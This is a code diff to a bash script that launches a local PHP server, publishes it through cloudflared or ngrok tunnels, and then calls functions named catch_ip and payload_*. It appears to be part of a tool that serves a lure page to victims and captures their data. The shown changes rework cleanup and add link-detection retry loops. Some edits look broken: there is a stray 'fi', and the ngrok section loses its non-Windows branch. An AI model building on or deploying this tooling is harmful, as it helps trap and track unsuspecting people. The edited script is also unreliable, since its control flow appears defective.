@@ -51,33 +51,21 @@ command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not instal
 }
 
 stop() {
+printf "\n\e[1;93m[\e[0m!\e[1;93m] Cleaning up and exiting...\e[0m\n"
 if [[ "$windows_mode" == true ]]; then
   # Windows-specific process termination
-  taskkill /F /IM "ngrok.exe" 2>/dev/null
-  taskkill /F /IM "php.exe" 2>/dev/null
-  taskkill /F /IM "cloudflared.exe" 2>/dev/null
+  taskkill /F /IM "ngrok.exe" /IM "php.exe" /IM "cloudflared.exe" 2>/dev/null
 else
   # Unix-like systems
-  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
-  checkphp=$(ps aux | grep -o "php" | head -n1)
-  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)
-
-  if [[ $checkngrok == *'ngrok'* ]]; then
-    pkill -f -2 ngrok > /dev/null 2>&1
-    killall -2 ngrok > /dev/null 2>&1
-  fi
-
-  if [[ $checkphp == *'php'* ]]; then
-    killall -2 php > /dev/null 2>&1
-  fi
-
-  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
-    pkill -f -2 cloudflared > /dev/null 2>&1
-    killall -2 cloudflared > /dev/null 2>&1
-  fi
+  # Kill processes started by this script
+  pkill -f "php -S 127.0.0.1:3333" > /dev/null 2>&1
+  pkill -f "cloudflared tunnel" > /dev/null 2>&1
+  pkill -f "ngrok http" > /dev/null 2>&1
+  
+  # Standard killall as backup
+  killall php ngrok cloudflared 2>/dev/null
 fi
-
-exit 1
+exit 0
 }
 
 catch_ip() {
@@ -258,12 +246,20 @@ else
     fi
 fi
 fi
+fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+# Ensure port 3333 is free
+if [[ "$windows_mode" == true ]]; then
+  taskkill /F /FI "CMDLINE eq php -S 127.0.0.1:3333" > /dev/null 2>&1
+else
+  pkill -f "php -S 127.0.0.1:3333" > /dev/null 2>&1
+fi
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
+
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
-rm -rf .cloudflared.log > /dev/null 2>&1
+rm -rf .cloudflared.log
 touch .cloudflared.log
 
 if [[ "$windows_mode" == true ]]; then
@@ -272,20 +268,24 @@ else
     ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
 fi
 
-printf "\e[1;92m[\e[0m+\e[1;92m] Waiting for direct link...\n"
-sleep 15
-link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
+printf "\e[1;92m[\e[0m+\e[1;92m] Waiting for direct link (timeout 60s)...\e[0m\n"
+for i in {1..20}; do
+    sleep 3
+    if [[ -f ".cloudflared.log" ]]; then
+        link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
+        if [[ -n "$link" ]]; then
+            break
+        fi
+    fi
+    printf "\e[1;93m[\e[0m*\e[1;93m] Retrying link detection... ($i/20)\e[0m\n"
+done
+
 if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlare tunnel service might be down\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m CloudFlared is already running, run this command killall cloudflared\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running: ./cloudflared tunnel --url 127.0.0.1:3333 to see specific errors\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m On Windows, try running: cloudflared.exe tunnel --url 127.0.0.1:3333\n"
-exit 1
+    printf "\e[1;31m[!] Error: Tunnel failed to generate a link.\e[0m\n"
+    printf "\e[1;93m[!] Try manual debug: ./cloudflared tunnel --url http://127.0.0.1:3333\e[0m\n"
+    stop
 else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+    printf "\e[1;92m[\e[0m*\e[1;92m] Success! Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 fi
 payload_cloudflare
 checkfound
@@ -404,44 +404,41 @@ if [[ "$windows_mode" == true ]]; then
         ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
     fi
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-    sleep 2
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-    ./ngrok.exe http 3333 > /dev/null 2>&1 &
-else
-    if [[ -e ~/.ngrok2/ngrok.yml ]]; then
-        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
-        cat  ~/.ngrok2/ngrok.yml
-        read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
-        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-            ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
-            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
-        fi
+    # Ensure port 3333 is free
+    if [[ "$windows_mode" == true ]]; then
+      taskkill /F /FI "CMDLINE eq php -S 127.0.0.1:3333" > /dev/null 2>&1
     else
-        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
-        ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
+      pkill -f "php -S 127.0.0.1:3333" > /dev/null 2>&1
     fi
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
     php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
     sleep 2
     printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
-    ./ngrok http 3333 > /dev/null 2>&1 &
+    if [[ "$windows_mode" == true ]]; then
+        ./ngrok.exe http 3333 > /dev/null 2>&1 &
+    else
+        ./ngrok http 3333 > /dev/null 2>&1 &
+    fi
 fi
 
-sleep 10
+printf "\e[1;92m[\e[0m+\e[1;92m] Waiting for direct link (timeout 60s)...\e[0m\n"
+for i in {1..20}; do
+    sleep 3
+    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+    if [[ -n "$link" ]]; then
+        break
+    fi
+    printf "\e[1;93m[\e[0m*\e[1;93m] Retrying link detection... ($i/20)\e[0m\n"
+done
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
 if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngrok http 3333\n"
-exit 1
+    printf "\e[1;31m[!] Error: Ngrok failed to generate a link.\e[0m\n"
+    printf "\e[1;93m[!] Possible reasons:\n"
+    printf "    * Invalid Authtoken\n"
+    printf "    * Internet issues\n"
+    printf "    * Port 3333 already in use\e[0m\n"
+    stop
 else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+    printf "\e[1;92m[\e[0m*\e[1;92m] Success! Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 fi
 payload_ngrok
 checkfound
